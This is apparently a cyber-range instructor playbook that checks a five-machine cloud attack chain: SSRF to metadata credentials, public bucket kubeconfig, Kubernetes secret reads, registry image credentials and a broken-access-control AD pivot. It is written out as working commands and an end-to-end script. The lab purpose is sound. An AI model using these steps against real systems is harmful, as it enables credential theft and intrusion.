# RNG-CLD-01 — OPERATION GRIDFALL
# Cloud Zone Test Playbook
# ============================================================
# Format mirrors the AD range playbook.
# Run this end-to-end before every exercise session to confirm
# all 5 machines are correctly configured and the pivot chain works.
# ============================================================

---

## SETUP: Set Your Variables

```bash
# Set these to your actual IPs
export KALI_IP=<your_kali_ip>
export M1_IP=11.0.2.10     # cld-webapp
export M2_IP=11.0.2.20     # cld-storage
export M3_IP=11.0.2.30     # cld-k8s
export M4_IP=40.0.2.40     # cld-registry  ← confirm with your VM
export M5_IP=11.0.2.50     # cld-iam
export AD_DC_IP=33.55.55.137
export AD_WEB_IP=33.55.55.129

# Credential variables (filled as you progress)
export CLOUD_API_KEY="pul-cloud-dev-aK8x2mP9!2024"
export AWS_ACCESS_KEY_ID="AKIAPUL2024CLDSVC01"
export AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!'
export K8S_TOKEN="pul-cloud-ci-runner-token-2024gridfall"
export REG_USER="registry-admin"
export REG_PASS='Reg!stry@CLD2024'
export IAM_USER="cloud-iam-svc"
export IAM_PASS='IAm@CLD!2025'
export AD_BIND_USER="svc_ldap"
export AD_BIND_PASS='Ld@pB1nd#2025!'
```

---

## STEP 0: RECON

### 0.1 — Discover cloud zone hosts

```bash
nmap -sn 11.0.2.0/24
```

### 0.2 — Port scan each host

```bash
nmap -sV -sC -p 8080,9000,9001,6443,5000 \
    $M1_IP $M2_IP $M3_IP $M4_IP $M5_IP -oN cloud_scan.txt
```

### 0.3 — Quick service fingerprint

```bash
# M1: Cloud portal should return HTML
curl -si http://$M1_IP:8080/ | head -5

# M2: MinIO health endpoint
curl -si http://$M2_IP:9000/minio/health/live

# M3: K8s API (unauthenticated — expect 401 or 403, NOT connection refused)
curl -sk https://$M3_IP:6443/api/v1 | python3 -m json.tool | head -5

# M4: Registry v2 ping (expect 401 — auth required)
curl -si http://$M4_IP:5000/v2/

# M5: IAM health endpoint
curl -s http://$M5_IP:8080/api/v1/status
```

Expected results:
- M1: HTTP 200 with `PUL CLOUD PORTAL` in body, or redirect to `/login`
- M2: HTTP 200 from health endpoint
- M3: HTTP 401 `{"kind":"Status",...}` — API server responding
- M4: HTTP 401 with `WWW-Authenticate: Basic realm="pul-cloud-registry"`
- M5: `{"status":"healthy","version":"3.1.0","region":"in-south-1"}`

---

## STEP 1: SSRF → IMDS CREDENTIAL THEFT — M1 cld-webapp

### 1.1 — Log in to the portal

```bash
# Browser: http://$M1_IP:8080
# Credentials: cloud-dev / CloudDev@PUL2024!

# Or via curl (captures session cookie):
curl -s -c /tmp/m1-cookie.txt -X POST http://$M1_IP:8080/login \
    -d "username=cloud-dev&password=CloudDev%40PUL2024%21" \
    -L -o /dev/null -w "HTTP %{http_code}\n"
```

Expected: HTTP 200 (after redirect to `/dashboard`)

### 1.2 — Explore the IMDS via SSRF

Navigate to Tools → URL Health Checker (or use API key directly):

```bash
# Step A: List available metadata
curl -s -b /tmp/m1-cookie.txt \
    -X POST http://$M1_IP:8080/tools/url-check \
    -d "url=http://169.254.169.254/latest/meta-data/" \
    | grep -o 'iam[^<]*\|instance[^<]*' | head -10

# Step B: List IAM role name
curl -s -b /tmp/m1-cookie.txt \
    -X POST http://$M1_IP:8080/tools/url-check \
    -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step C: Steal the credentials
curl -s -b /tmp/m1-cookie.txt \
    -X POST http://$M1_IP:8080/tools/url-check \
    -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role" \
    | python3 -m json.tool
```

Expected output from Step C:
```json
{
  "Code": "Success",
  "AccessKeyId": "AKIAPUL2024CLDSVC01",
  "SecretAccessKey": "pULcLd/S3cr3t2024/K3y!",
  "Expiration": "2025-12-31T23:59:59Z"
}
```

### 1.3 — Alternative: Use API key directly (no browser needed)

```bash
# API key is in the Tools page UI — simulates attacker using dev portal API
curl -s -H "X-Cloud-API-Key: $CLOUD_API_KEY" \
    -X POST http://$M1_IP:8080/tools/url-check \
    -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role" \
    | python3 -m json.tool
```

---

## TEST CONTINGENCY C1a: IMDS Direct (if M1 web app is down)

If the Flask portal is down but the IMDS service is running, the loopback
alias is still reachable from the VM itself — confirms the IMDS is correctly
configured independently of the web app.

```bash
# From M1 VM directly
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role
```

Should return the same JSON with `AccessKeyId: AKIAPUL2024CLDSVC01`.

---

## STEP 2: PUBLIC BUCKET ENUMERATION — M2 cld-storage

### 2.1 — Enumerate with stolen credentials (AWS CLI)

```bash
# Configure AWS CLI to use MinIO endpoint
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID
aws configure set aws_secret_access_key "$AWS_SECRET_ACCESS_KEY"

# List all buckets
aws s3 ls --endpoint-url http://$M2_IP:9000

# List the public bucket
aws s3 ls s3://pul-cloud-backups/ --endpoint-url http://$M2_IP:9000 --recursive
```

Expected: `pul-cloud-backups` and `pul-cloud-internal` buckets.
`pul-cloud-backups` lists: `README.txt`, `k8s/cluster-info.txt`,
`k8s/cloud-ci-kubeconfig.yaml`, `backups/`, `configs/deployment-notes.txt`

### 2.2 — Download the kubeconfig

```bash
aws s3 cp s3://pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml ./cloud-ci-kubeconfig.yaml \
    --endpoint-url http://$M2_IP:9000

cat ./cloud-ci-kubeconfig.yaml | grep token
```

Should show: `token: pul-cloud-ci-runner-token-2024gridfall`

### 2.3 — Anonymous enumeration (no credentials — proves public misconfiguration)

```bash
# List bucket without any auth
curl -s "http://$M2_IP:9000/pul-cloud-backups?list-type=2" \
    | python3 -c "
import sys
data = sys.stdin.read()
import re
keys = re.findall(r'<Key>(.*?)</Key>', data)
for k in keys: print(k)
"

# Download kubeconfig without auth
curl -s "http://$M2_IP:9000/pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml"
```

Both should return data — confirming public bucket misconfiguration.

### 2.4 — Verify internal bucket is private

```bash
# pul-cloud-internal should require credentials
curl -si "http://$M2_IP:9000/pul-cloud-internal?list-type=2" | head -5
# Expected: 403 AccessDenied
```

---

## TEST CONTINGENCY C2a: MinIO Console (if API enumeration is blocked)

```bash
# MinIO Web Console at port 9001
# URL: http://$M2_IP:9001
# Login: AKIAPUL2024CLDSVC01 / pULcLd/S3cr3t2024/K3y!
# Browse to pul-cloud-backups → k8s → download cloud-ci-kubeconfig.yaml
curl -si http://$M2_IP:9001/ | head -3
```

Should return the MinIO console login page.

---

## STEP 3: K8s RBAC EXPLOITATION — M3 cld-k8s

### 3.1 — Use kubeconfig from M2

```bash
export KUBECONFIG=./cloud-ci-kubeconfig.yaml

# Confirm cluster access
kubectl cluster-info
kubectl get nodes
```

Expected: `Kubernetes control plane is running at https://$M3_IP:6443`

### 3.2 — Enumerate the namespace

```bash
kubectl get all -n pul-cloud
kubectl get secrets -n pul-cloud
kubectl get configmaps -n pul-cloud
```

Should show:
- Secrets: `registry-creds`, `db-creds`
- ConfigMaps: `platform-config`
- Deployment: `platform-api` (0 replicas)

### 3.3 — Read the pivot secret

```bash
# Method A: kubectl (base64 decode each field)
kubectl get secret registry-creds -n pul-cloud -o json | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)['data']
for k, v in d.items():
    print(f'{k}: {base64.b64decode(v).decode()}')
"

# Method B: direct API with raw token
curl -sk \
    -H "Authorization: Bearer $K8S_TOKEN" \
    "https://$M3_IP:6443/api/v1/namespaces/pul-cloud/secrets/registry-creds" \
    | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)['data']
for k, v in d.items():
    print(f'{k}: {base64.b64decode(v).decode()}')
"
```

Expected output:
```
username: registry-admin
password: Reg!stry@CLD2024
registry: 11.0.2.40:5000
docker-config: {"auths":{"11.0.2.40:5000":...}}
```

### 3.4 — Verify RBAC boundary (should NOT be able to read other namespaces)

```bash
# Should fail with Forbidden — confirms RBAC is scoped correctly
kubectl get secrets -n kube-system 2>&1 | grep -i "forbidden\|error"
```

Expected: `Error from server (Forbidden)`

---

## TEST SKIP-C3: ServiceCredentials shortcut

While authenticated to K8s, check the platform-config ConfigMap for hints:

```bash
kubectl get configmap platform-config -n pul-cloud -o yaml | grep -i "iam\|registry\|storage"
```

Shows `iam-endpoint: http://11.0.2.50:8080` — hints at M5 directly, but doesn't
give credentials. Players still need M4 to get `cloud-iam-svc` credentials.

---

## STEP 4: CONTAINER IMAGE CREDENTIAL EXTRACTION — M4 cld-registry

### 4.1 — Authenticate and list repositories

```bash
# Confirm auth works
curl -su "$REG_USER:$REG_PASS" http://$M4_IP:5000/v2/
# Expected: {} with HTTP 200

# List repositories
curl -su "$REG_USER:$REG_PASS" http://$M4_IP:5000/v2/_catalog
# Expected: {"repositories":["pul-cloud/platform-svc"]}
```

### 4.2 — Get the image manifest

```bash
MANIFEST=$(curl -su "$REG_USER:$REG_PASS" \
    http://$M4_IP:5000/v2/pul-cloud/platform-svc/manifests/latest \
    -H "Accept: application/vnd.docker.distribution.manifest.v2+json")

echo $MANIFEST | python3 -m json.tool
```

Note the `config.digest` value — this is the config blob containing ENV vars.

### 4.3 — Download config blob and extract credentials

```bash
CONFIG_DIGEST=$(echo $MANIFEST | python3 -c \
    "import sys,json; print(json.load(sys.stdin)['config']['digest'])")

echo "Config digest: $CONFIG_DIGEST"

curl -su "$REG_USER:$REG_PASS" \
    http://$M4_IP:5000/v2/pul-cloud/platform-svc/blobs/$CONFIG_DIGEST \
    | python3 -c "
import sys, json
data = json.load(sys.stdin)
print('=== ENV vars in image config ===')
for env in data.get('config', {}).get('Env', []):
    print(env)
"
```

Expected — among all ENV vars:
```
CLOUD_IAM_URL=http://11.0.2.50:8080
CLOUD_IAM_USER=cloud-iam-svc
CLOUD_IAM_PASS=IAm@CLD!2025
```

### 4.4 — Alternative: Extract via layer tarball (finds the .env file)

```bash
LAYER_DIGEST=$(echo $MANIFEST | python3 -c \
    "import sys,json; print(json.load(sys.stdin)['layers'][0]['digest'])")

# Download layer and extract the .env config file
curl -su "$REG_USER:$REG_PASS" \
    http://$M4_IP:5000/v2/pul-cloud/platform-svc/blobs/$LAYER_DIGEST \
    | tar xzO opt/app/config/.env
```

Expected: `.env` file containing `CLOUD_IAM_USER` and `CLOUD_IAM_PASS`.

---

## STEP 5: BROKEN ACCESS CONTROL → AD PIVOT — M5 cld-iam

### 5.1 — Login as cloud-iam-svc and observe the UI restriction

```bash
curl -s -c /tmp/m5-cookie.txt -X POST http://$M5_IP:8080/login \
    -d "username=cloud-iam-svc&password=IAm%40CLD%212025" \
    -L -o /dev/null -w "HTTP %{http_code}\n"
```

Expected: HTTP 200

```bash
# View the Integrations page — shows 🔒 padlock on Export Config
curl -s -b /tmp/m5-cookie.txt http://$M5_IP:8080/integrations \
    | grep -i "federation_admin\|lock\|export" | head -5
```

The UI shows a padlock and the text `federation_admin` — misleading players into
thinking the endpoint is protected.

### 5.2 — Call the export API directly (bypass the UI restriction)

```bash
# THIS IS THE VULNERABILITY — no role check on the server side
curl -s -b /tmp/m5-cookie.txt \
    http://$M5_IP:8080/api/v1/integrations/int-ad-corp-001/export \
    | python3 -m json.tool
```

Expected full response:
```json
{
  "status": "success",
  "data": {
    "integration_id": "int-ad-corp-001",
    "config": {
      "domain": "cyberange.local",
      "dc_ip": "33.55.55.137",
      "bind_dn": "CN=svc_ldap,CN=Users,DC=cyberange,DC=local",
      "bind_password": "Ld@pB1nd#2025!",
      ...
    },
    "web_admin_panel": "http://33.55.55.129/admin/"
  }
}
```

### 5.3 — Extract just the pivot credential

```bash
curl -s -b /tmp/m5-cookie.txt \
    http://$M5_IP:8080/api/v1/integrations/int-ad-corp-001/export \
    | python3 -c "
import sys, json
d = json.load(sys.stdin)['data']
cfg = d['config']
print(f\"Domain       : {cfg['domain']}\")
print(f\"DC IP        : {cfg['dc_ip']}\")
print(f\"Bind Account : CN=svc_ldap\")
print(f\"Bind Password: {cfg['bind_password']}\")
print(f\"Admin Panel  : {d['web_admin_panel']}\")
"
```

### 5.4 — Confirm pivot credential works against AD

```bash
# Verify svc_ldap authenticates to the domain controller
nxc smb $AD_DC_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
```

Expected: `[+] cyberange.local\svc_ldap:Ld@pB1nd#2025!`

```bash
# Check what svc_ldap can access
nxc smb $AD_DC_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local --shares
nxc ldap $AD_DC_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local --users | head -20
```

---

## TEST CONTINGENCY C5a: Admin login (confirm full chain as federation_admin)

```bash
# Login as iam-admin to verify the endpoint ALSO works for the privileged role
# (confirms the intended code path, and the UI Export link works)
curl -s -c /tmp/m5-admin-cookie.txt -X POST http://$M5_IP:8080/login \
    -d "username=iam-admin&password=IamAdmin%40PUL2024%21" \
    -L -o /dev/null -w "HTTP %{http_code}\n"

curl -s -b /tmp/m5-admin-cookie.txt \
    http://$M5_IP:8080/integrations \
    | grep -i "Export Config" | head -3
```

Expected: `Export Config` link visible (not the padlock) for `iam-admin`.

```bash
# Should also work via API
curl -s -b /tmp/m5-admin-cookie.txt \
    http://$M5_IP:8080/api/v1/integrations/int-ad-corp-001/export \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['status'])"
```

---

## FULL END-TO-END CHAIN VERIFY

Run this block to confirm the entire cloud pivot chain in one shot:

```bash
#!/bin/bash
set -e
M1_IP=11.0.2.10
M2_IP=11.0.2.20
M3_IP=11.0.2.30
M4_IP=11.0.2.40
M5_IP=11.0.2.50

echo "=== GRIDFALL Cloud Range — Full Chain Verification ==="
echo ""

# M1: SSRF → IMDS
echo "[*] M1: SSRF → IMDS..."
CREDS=$(curl -s -c /tmp/gc-m1.txt -X POST http://$M1_IP:8080/login \
    -d "username=cloud-dev&password=CloudDev%40PUL2024%21" -L -o /dev/null \
    && curl -s -b /tmp/gc-m1.txt -X POST http://$M1_IP:8080/tools/url-check \
    -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role")
echo "$CREDS" | grep -q "AKIAPUL2024CLDSVC01" \
    && echo "[✓] M1: AccessKeyId extracted" || { echo "[✗] M1 FAILED"; exit 1; }

# M2: Public bucket → kubeconfig
echo "[*] M2: Public bucket..."
KUBECONF=$(curl -s "http://$M2_IP:9000/pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml")
echo "$KUBECONF" | grep -q "pul-cloud-ci-runner-token-2024gridfall" \
    && echo "[✓] M2: K8s token found in kubeconfig" || { echo "[✗] M2 FAILED"; exit 1; }

# M3: K8s secrets
echo "[*] M3: K8s RBAC..."
SECRET=$(curl -sk -H "Authorization: Bearer pul-cloud-ci-runner-token-2024gridfall" \
    "https://$M3_IP:6443/api/v1/namespaces/pul-cloud/secrets/registry-creds")
echo "$SECRET" | python3 -c "
import sys,json,base64
d=json.load(sys.stdin)['data']
pw=base64.b64decode(d['password']).decode()
assert pw=='Reg!stry@CLD2024', f'Wrong password: {pw}'
print('[✓] M3: registry-creds secret readable, password correct')
" || { echo "[✗] M3 FAILED"; exit 1; }

# M4: Image ENV creds
echo "[*] M4: Container image..."
MANIFEST=$(curl -su "registry-admin:Reg!stry@CLD2024" \
    http://$M4_IP:5000/v2/pul-cloud/platform-svc/manifests/latest \
    -H "Accept: application/vnd.docker.distribution.manifest.v2+json")
CONFIG_DIG=$(echo "$MANIFEST" | python3 -c "import sys,json; print(json.load(sys.stdin)['config']['digest'])")
CONFIG=$(curl -su "registry-admin:Reg!stry@CLD2024" \
    "http://$M4_IP:5000/v2/pul-cloud/platform-svc/blobs/$CONFIG_DIG")
echo "$CONFIG" | grep -q "IAm@CLD!2025" \
    && echo "[✓] M4: IAM password found in image ENV" || { echo "[✗] M4 FAILED"; exit 1; }

# M5: Broken access control → AD creds
echo "[*] M5: Broken access control..."
curl -s -c /tmp/gc-m5.txt -X POST http://$M5_IP:8080/login \
    -d "username=cloud-iam-svc&password=IAm%40CLD%212025" -L -o /dev/null
EXPORT=$(curl -s -b /tmp/gc-m5.txt \
    http://$M5_IP:8080/api/v1/integrations/int-ad-corp-001/export)
echo "$EXPORT" | grep -q "Ld@pB1nd#2025!" \
    && echo "[✓] M5: AD bind password leaked via broken access control" \
    || { echo "[✗] M5 FAILED"; exit 1; }

rm -f /tmp/gc-m1.txt /tmp/gc-m5.txt

echo ""
echo "======================================================"
echo "  ALL CHECKS PASSED — Cloud range ready for exercise"
echo "  Pivot to AD range:"
echo "  svc_ldap : Ld@pB1nd#2025! @ cyberange.local"
echo "  DC IP    : 33.55.55.137"
echo "  Web admin: http://33.55.55.129/admin/"
echo "======================================================"
```

---

## CLEANUP AFTER TESTING

```bash
# Clear cookies
rm -f /tmp/m1-cookie.txt /tmp/m5-cookie.txt /tmp/m5-admin-cookie.txt

# Remove downloaded kubeconfig
rm -f ./cloud-ci-kubeconfig.yaml

# Remove any test SQL Agent jobs on AD range (see AD playbook Step 2.7)
# Restore CorpBuildSvc on DEV (see AD playbook Step 3.4)

# If you changed any LAPS passwords, reset them from DC03:
# Reset-AdmPwdPassword -ComputerName "SRV11-JUMP"
```

---

## SUMMARY: What Each Step Proves

| Step | What You're Testing | Success Criteria |
|---|---|---|
| 0 | Network visibility | All 5 cloud hosts found, ports open |
| 1 | SSRF → IMDS | AccessKeyId + SecretAccessKey in response |
| C1a | IMDS direct access | Same creds reachable from VM directly |
| 2 | Public bucket listing | kubeconfig downloaded without auth |
| C2a | MinIO console access | Web console reachable at :9001 |
| 3 | K8s RBAC over-privilege | registry-creds secret readable with CI token |
| C3 | ConfigMap recon | IAM endpoint hint visible in platform-config |
| 4 | Image config blob | CLOUD_IAM_PASS in ENV section of config blob |
| 4 | Layer tarball | .env file extractable from layer |
| 5 | Broken access control | bind_password returned for non-admin user |
| C5a | Admin path | Export Config link visible for federation_admin |
| AD | Pivot verification | svc_ldap authenticates to cyberange.local |
